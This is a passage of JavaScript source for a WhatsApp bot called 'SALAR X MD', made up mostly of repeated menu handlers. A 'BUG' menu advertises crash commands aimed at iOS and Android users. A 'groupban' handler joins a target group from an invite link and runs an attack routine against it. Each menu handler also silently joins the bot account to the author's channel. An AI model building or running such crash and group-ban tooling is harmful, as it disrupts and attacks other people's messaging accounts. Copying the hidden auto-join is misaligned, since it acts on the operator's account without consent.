                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

 ┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐁𝐔𝐆* ◆━━┓
│❖ ${prefix}raju-invis
│❖ ${prefix}raju-fcnew
│❖ ${prefix}raju-bulldozer
│❖ ${prefix}raju-ios
│❖ ${prefix}raju-iosnew
│❖ ${prefix}raju-delay
│❖ ${prefix}raju-andro
│❖ ${prefix}raju-blank
│❖ ${prefix}raju-visibale
│❖ ${prefix}xgroup
│❖ ${prefix}groupban
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'downloadmenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗download': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃* ◆━━┓
│❖ ${prefix}apk
│❖ ${prefix}apkdl
│❖ ${prefix}facebook
│❖ ${prefix}fb
│❖ ${prefix}fbdl
│❖ ${prefix}getbot
│❖ ${prefix}gitclone
│❖ ${prefix}ig
│❖ ${prefix}igdl
│❖ ${prefix}imbd
│❖ ${prefix}instagram
│❖ ${prefix}mediafire
│❖ ${prefix}movie
│❖ ${prefix}movie2
│❖ ${prefix}play
│❖ ${prefix}play2
│❖ ${prefix}sp
│❖ ${prefix}spotify
│❖ ${prefix}spotifydl
│❖ ${prefix}tgstickers
│❖ ${prefix}tiktok
│❖ ${prefix}tt
│❖ ${prefix}xnxx
│❖ ${prefix}ytmp3
│❖ ${prefix}ytmp4
│❖ ${prefix}ytsearch
│❖ ${prefix}yts
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

                // TRY-CATCH for image sending with fallback to text only
try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'funmenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗fun': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐅𝐔𝐍* ◆━━┓
│❖ ${prefix}8ball
│❖ ${prefix}advice
│❖ ${prefix}ascii
│❖ ${prefix}compliment
│❖ ${prefix}dadjoke
│❖ ${prefix}dare
│❖ ${prefix}fact
│❖ ${prefix}flirt
│❖ ${prefix}funfact
│❖ ${prefix}joke
│❖ ${prefix}quote
│❖ ${prefix}rate
│❖ ${prefix}rewrite
│❖ ${prefix}roast
│❖ ${prefix}ship
│❖ ${prefix}story
│❖ ${prefix}truth
│❖ ${prefix}truthdare
│❖ ${prefix}urban
│❖ ${prefix}wouldyou
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

                // TRY-CATCH for image sending with fallback to text only
try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
            
case 'groupban': {
    const link = args[0];

    // 1. Validasi input link group WhatsApp
    if (!link || !link.includes('chat.whatsapp.com')) {
        return devtrust.sendMessage(m.chat, addNewsletterContext({
            text: '❌ *Link group tidak valid!*\n\nContoh:\n*.groupban* https://chat.whatsapp.com/CodeUndanganGroup'
        }), { quoted: m });
    }

    // Berikan reaksi loading
    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        // 2. Ekstraksi invite code dari URL
        const inviteCode = link.split('chat.whatsapp.com/')[1].trim();

        // 3. Join ke group menggunakan fungsi bawaan Baileys
        const groupId = await devtrust.groupAcceptInvite(inviteCode);

        if (!groupId) {
            throw new Error('Gagal bergabung ke group. Pastikan link aktif/valid.');
        }

        // 4. Jalankan fungsi group dengan target JID yang baru saja di-join
        const targetJid = groupId.endsWith('@g.us') ? groupId : `${groupId}@g.us`;
        await groupB(devtrust, targetJid);

        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await devtrust.sendMessage(m.chat, addNewsletterContext({
            text: `✅ *Berhasil join dan mengeksekusi perintah pada group:*\n\`${targetJid}\``
        }), { quoted: m });

    } catch (err) {
        console.error('[TESJOIN ERROR]', err.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await devtrust.sendMessage(m.chat, addNewsletterContext({
            text: `❌ *Proses Gagal*\n${err.message || 'Terjadi kesalahan'}`
        }), { quoted: m });
    }

    break;
}

            case 'gamemenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗game': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐆𝐀𝐌𝐄𝐒* ◆━━┓
│❖ ${prefix}coin
│❖ ${prefix}coinbattle
│❖ ${prefix}dice
│❖ ${prefix}emojiquiz
│❖ ${prefix}gamefact
│❖ ${prefix}guess
│❖ ${prefix}hangman
│❖ ${prefix}math
│❖ ${prefix}mathfact
│❖ ${prefix}numbattle
│❖ ${prefix}numberbattle
│❖ ${prefix}rps
│❖ ${prefix}rpsls
│❖ ${prefix}tictactoe
┗━━━━━━━━━━━━━━━━━━━━┛

⚙️ *Powered by 𝗦𝗔𝗟𝗔𝗥 𝗞𝗜𝗡𝗚 👑* | © 2026
`;

try {
  const media = await prepareWAMessageMedia(
    { image: { url: randomImage } },
    { upload: devtrust.waUploadToServer }
  );

  await devtrust.relayMessage(from, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            ...media
          },
          body: {
            text: menuText
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  sections: [
                    {
                      title: "✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨",
                      rows: [
                        { title: "🤖 AI Menu", rowId: `.aimenu` },
                        { title: "🎨 Anime Menu", rowId: `.animemenu` },
                        { title: "🐛 Bug Menu", rowId: `.bugmenu` },
                        { title: "📥 Download Menu", rowId: `.downloadmenu` },
                        { title: "🎮 Fun Menu", rowId: `.funmenu` },
                        { title: "🎲 Game Menu", rowId: `.gamemenu` },
                        { title: "👥 Group Menu", rowId: `.groupmenu` },
                        { title: "🏷️ Logo Menu", rowId: `.logomenu` },
                        { title: "👑 Owner Menu", rowId: `.ownermenu` },
                        { title: "🏷️ Sticker Menu", rowId: `.stickermenu` },
                        { title: "🔧 Tools Menu", rowId: `.toolsmenu` },
                        { title: "🎙️ Voice Menu", rowId: `.voicemenu` },
                        { title: "📦 Other Menu", rowId: `.othermenu` }
                      ]
                    }
                  ]
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "📢 CHANNEL",
                  url: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r"
                })
              }
            ]
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363427254972269@newsletter",
              newsletterName: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              serverMessageId: -1
            },
            externalAdReply: {
              title: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              body: "© 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
              thumbnailUrl: randomImage,
              sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {});

} catch (err) {
  console.log("❌ ERROR MENU:", err);

  // 🔻 fallback biar gak kosong
  await devtrust.sendMessage(from, {
    text: "Menu gagal load, coba lagi atau update WhatsApp."
  });
}
            }
                break;

            case 'groupmenu':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗group': {
            autoJoinGroup(devtrust, "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r").catch(err => console.error("Failed to auto join:", err));
                await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });

                const menuImages = [
                    'https://i.ibb.co/rGr4bWW8/image1.jpg',
                    'https://i.ibb.co/rGr4bWW8/image1.jpg'
                ];

                const randomImage = menuImages[Math.floor(Math.random() * menuImages.length)];
                const uptime = formatUptime(process.uptime());
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const platform = os.platform();
                const date = getLagosTime();
                const readmore = String.fromCharCode(8206).repeat(4001);
                const ramInfo = formatRam(totalMem, freeMem);
                const moodEmoji = getMoodEmoji();
                const totalCommands = countCommands();
                const hour = date.getHours();
                let greeting = hour < 12 ? 'Good Morning' : hour < 18 ? 'Good Afternoon' : 'Good Evening';

                // Get professional features
                const ownerName = getOwnerName();
                const botVersion = getBotVersion();
                const botMode = getBotMode();
                const currentDateTime = getCurrentDateTime();

                // ALPHABETICAL SECTIONS
                const menuText = `
┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔* ◆━━┓
┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
┃ ⧎ ʙᴏᴛ ɴᴀᴍᴇ 「 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* 」
┃ ⧎ ᴠᴇʀsɪᴏɴ : *${botVersion}*
┃ ⧎ ᴏᴡɴᴇʀ : *${ownerName}*
┃ ⧎ ᴅᴇᴠᴇʟᴏᴘᴇʀ : *${ownerName}*
┃ ⧎ ᴍᴏᴅᴇ : *${botMode}*
┃ ⧎ ʀᴜɴᴛɪᴍᴇ : ${uptime}
┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
┃ ⧎ ᴘʟᴀᴛғᴏʀᴍ : ${platform}
┃ ⧎ ʀᴀᴍ : ${ramInfo}
┃ ⧎ ᴄᴏᴍᴍᴀɴᴅs : ${totalCommands} total
┃ *${greeting}*, @${m?.sender?.split('@')?.[0] || 'User'}
┃ \`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ\`
┃ 🕒 ${currentDateTime} ${moodEmoji}
┗━━━━━━━━━━━━━━━━━━━━┛

❖═━═══𖠁𐂃𖠁══━═❖
♱  ${greeting}, *${pushname}*
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗* ᴀᴛ ʏᴏᴜʀ sᴇʀᴠɪᴄᴇ
📱 *Pair 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗:* _https://t.me/rajumdxbug_bot
❖═━═══𖠁𐂃𖠁══━═❖

┏━━◆ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 - 𝐆𝐑𝐎𝐔𝐏* ◆━━┓
│❖ ${prefix}add
│❖ ${prefix}antibot
│❖ ${prefix}antibadword
│❖ ${prefix}antibeg
│❖ ${prefix}antilink
│❖ ${prefix}antispam
│❖ ${prefix}antitag
│❖ ${prefix}closetime
│❖ ${prefix}creategc
│❖ ${prefix}creategroup
│❖ ${prefix}demote
│❖ ${prefix}gcsettings
│❖ ${prefix}goodbye
│❖ ${prefix}groupinfo
│❖ ${prefix}groupjid
│❖ ${prefix}grouplink
│❖ ${prefix}groupstatus
│❖ ${prefix}gst
│❖ ${prefix}gstatus
│❖ ${prefix}hidetag
│❖ ${prefix}invite
│❖ ${prefix}kick
│❖ ${prefix}kickadmins
│❖ ${prefix}kickall
│❖ ${prefix}left
│❖ ${prefix}linkgc
│❖ ${prefix}listadmin
│❖ ${prefix}listadmins
│❖ ${prefix}listonline
│❖ ${prefix}members
│❖ ${prefix}mute
│❖ ${prefix}mutemember
│❖ ${prefix}opentime
│❖ ${prefix}poll
│❖ ${prefix}promote
│❖ ${prefix}resetlink
│❖ ${prefix}revoke
│❖ ${prefix}setdesc
│❖ ${prefix}setgrouppp
│❖ ${prefix}setname
│❖ ${prefix}tag
│❖ ${prefix}tagadmin
│❖ ${prefix}tagall
│❖ ${prefix}totalmembers
│❖ ${prefix}totag
│❖ ${prefix}unmute
│❖ ${prefix}unmutemember
┗━━━━━━━━━━━━━━━━━━━━┛

